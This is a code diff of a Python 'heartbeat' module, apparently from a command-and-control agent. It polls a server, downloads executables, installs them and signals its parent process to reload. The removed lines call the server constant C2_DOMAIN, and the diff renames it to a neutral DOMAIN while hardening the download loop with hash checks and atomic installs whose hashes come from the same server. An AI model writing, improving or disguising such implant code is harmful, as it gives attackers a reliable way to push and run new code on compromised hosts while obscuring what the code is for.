@@ -1,10 +1,12 @@
 import os
 import json
 import signal
+import hashlib
 import logging
+import requests
+import tempfile
 from pathlib import Path
 from typing import Optional
-import requests
 
 from .common import IntervalExecutable
 from crypto import crypto_manager
@@ -12,11 +14,20 @@ from crypto import crypto_manager
 logger = logging.getLogger(__name__)
 
 
+def hash_file(path: Path):
+    sha256 = hashlib.sha256()
+    with open(path, "rb") as f:
+        for chunk in iter(lambda: f.read(8192), b""):
+            sha256.update(chunk)
+    return sha256.hexdigest()
+
+
 class HeartbeatModule(IntervalExecutable):
     """Send a heartbeat and check for updates"""
 
     interval = 2
-    C2_DOMAIN = "http://localhost:8000"
+
+    DOMAIN = "http://localhost:8000"
     VERSION_FILE = Path("version.txt")
     EXECUTABLES_DIR = Path("executables")
     REQUEST_TIMEOUT = 10  # seconds
@@ -24,28 +35,25 @@ class HeartbeatModule(IntervalExecutable):
     @staticmethod
     def execute() -> None:
         try:
-            HeartbeatModule._check_and_update()
+            latest_version = HeartbeatModule._fetch_latest_version()
+            if latest_version is None:
+                return
+
+            local_version = HeartbeatModule._get_local_version()
+
+            if local_version is None or latest_version > local_version:
+                if HeartbeatModule._download_updates(local_version or -1):
+                    HeartbeatModule._save_version(latest_version)
+                    os.kill(os.getppid(), signal.SIGUSR1)
+
         except Exception as e:
             logger.error(f"Heartbeat execution failed: {e}", exc_info=True)
-
-    @staticmethod
-    def _check_and_update() -> None:
-        latest_version = HeartbeatModule._fetch_latest_version()
-        if latest_version is None:
-            return
-
-        local_version = HeartbeatModule._get_local_version()
-
-        if local_version is None or latest_version > local_version:
-            if HeartbeatModule._download_updates(local_version or -1):
-                HeartbeatModule._save_version(latest_version)
-                os.kill(os.getppid(), signal.SIGUSR1)
 
     @staticmethod
     def _fetch_latest_version() -> Optional[int]:
         try:
             response = requests.post(
-                url=f"{HeartbeatModule.C2_DOMAIN}/heartbeat",
+                url=f"{HeartbeatModule.DOMAIN}/heartbeat",
                 timeout=HeartbeatModule.REQUEST_TIMEOUT,
             )
             response.raise_for_status()
@@ -89,7 +97,7 @@ class HeartbeatModule(IntervalExecutable):
         try:
             # Fetch list of files to update
             updates_res = requests.get(
-                url=f"{HeartbeatModule.C2_DOMAIN}/updates",
+                url=f"{HeartbeatModule.DOMAIN}/updates",
                 params={"version": local_version},
                 timeout=HeartbeatModule.REQUEST_TIMEOUT,
             )
@@ -120,18 +128,48 @@ class HeartbeatModule(IntervalExecutable):
                 logger.error("Invalid files format")
                 return False
 
-            # Ensure directory exists
-            HeartbeatModule.EXECUTABLES_DIR.mkdir(parents=True, exist_ok=True)
+            # Create temporary directory for downloads
+            with tempfile.TemporaryDirectory() as temp_dir:
+                temp_path = Path(temp_dir)
 
-            # Download each file
-            for f in files:
-                filename = f.get("name")
-                if not HeartbeatModule._is_safe_filename(f.get("name")):
-                    logger.error(f"Unsafe filename rejected: {filename}")
-                    continue
+                # Download and validate all files first
+                downloaded_files = []
+                for f in files:
+                    filename = f.get("name")
+                    if not HeartbeatModule._is_safe_filename(filename):
+                        logger.error(f"Unsafe filename rejected: {filename}")
+                        return False
 
-                if not HeartbeatModule._download_file(filename):
-                    return False
+                    filehash = f.get("hash")
+                    if not filehash:
+                        logger.error(f"Missing hash for {filename}")
+                        return False
+
+                    temp_file_path = temp_path / filename
+                    if not HeartbeatModule._download_file(filename, temp_file_path):
+                        logger.error(f"Download failed for {filename}")
+                        return False
+
+                    # Verify hash
+                    actual_hash = hash_file(temp_file_path)
+                    if actual_hash != filehash:
+                        logger.error(
+                            f"Hash mismatch for {filename}: "
+                            f"expected {filehash}, got {actual_hash}"
+                        )
+                        return False
+
+                    downloaded_files.append((temp_file_path, filename))
+                    logger.info(f"Validated: {filename}")
+
+                # All files downloaded and validated - now commit them atomically
+                HeartbeatModule.EXECUTABLES_DIR.mkdir(parents=True, exist_ok=True)
+
+                for temp_file_path, filename in downloaded_files:
+                    target_path = HeartbeatModule.EXECUTABLES_DIR / filename
+                    # Atomic rename/replace
+                    temp_file_path.rename(target_path)
+                    logger.info(f"Installed: {filename}")
 
             return True
 
@@ -149,17 +187,16 @@ class HeartbeatModule(IntervalExecutable):
         return HeartbeatModule.EXECUTABLES_DIR.resolve() in safe_path.parents
 
     @staticmethod
-    def _download_file(filename: str) -> bool:
+    def _download_file(filename: str, target_path: Path) -> bool:
+        """Download file to specified path"""
         try:
             file_res = requests.get(
-                url=f"{HeartbeatModule.C2_DOMAIN}/updates/{filename}",
+                url=f"{HeartbeatModule.DOMAIN}/updates/{filename}",
                 timeout=HeartbeatModule.REQUEST_TIMEOUT,
             )
             file_res.raise_for_status()
 
-            target_path = HeartbeatModule.EXECUTABLES_DIR / filename
             target_path.write_bytes(file_res.content)
-            logger.info(f"Downloaded: {filename}")
             return True
 
         except requests.RequestException as e:
